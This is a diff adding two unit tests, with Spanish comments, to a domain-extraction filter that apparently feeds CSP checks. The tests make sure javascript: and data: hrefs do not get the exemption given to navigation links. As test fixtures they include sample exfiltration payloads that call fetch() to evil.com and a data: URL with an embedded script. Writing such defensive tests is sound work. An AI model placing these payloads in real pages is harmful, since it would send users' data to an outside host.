@@ -310,4 +310,34 @@ describe('un hipervínculo no es un origen de contenido', () => {
       'https://proveedor.example.com',
     ]);
   });
+
+  // **El agujero que este filtro podría abrir, cerrado.** La exención vale para una
+  // NAVEGACIÓN: la persona se va al sitio del tercero, en otra pestaña y con su propia
+  // sesión. Un `javascript:` no es eso — corre en el documento actual, transmite al hacer
+  // clic, y la CSP sí lo gobierna (`connect-src`). Un `data:` tampoco: navega a un
+  // documento con origen opaco.
+  //
+  // El caso concreto que se colaba: `&quot;` NO es una comilla literal, así que el grupo
+  // `[^"']+` no se corta ahí y el dominio quedaba DENTRO del href capturado, contándose
+  // como destino de enlace. Con comillas reales el `'` corta la captura y ya se detectaba.
+  it('un href que no es navegación no gana la exención', () => {
+    expect(
+      dominiosDe(`<a href="javascript:fetch(&quot;https://evil.com/exfiltra&quot;)">Continuar</a>`),
+    ).toEqual(['https://evil.com']);
+    expect(
+      dominiosDe(`<a href="javascript:window.location.href=&quot;https://evil.com/go&quot;">x</a>`),
+    ).toEqual(['https://evil.com']);
+    expect(
+      dominiosDe(`<a href="data:text/html,<script>fetch('https://evil.com')</script>">x</a>`),
+    ).toEqual(['https://evil.com']);
+  });
+
+  // Y la contraparte: un enlace normal SIGUE exento, incluido el redirector, que es
+  // navegación aunque el destino final esté en la URL.
+  it('una navegación normal sigue exenta', () => {
+    expect(dominiosDe(`<a href="https://norma.example.com/iso27001">La norma</a>`)).toEqual([]);
+    expect(
+      dominiosDe(`<a href="https://link.example.com/r?u=https://destino.example.com">ir</a>`),
+    ).toEqual([]);
+  });
 });
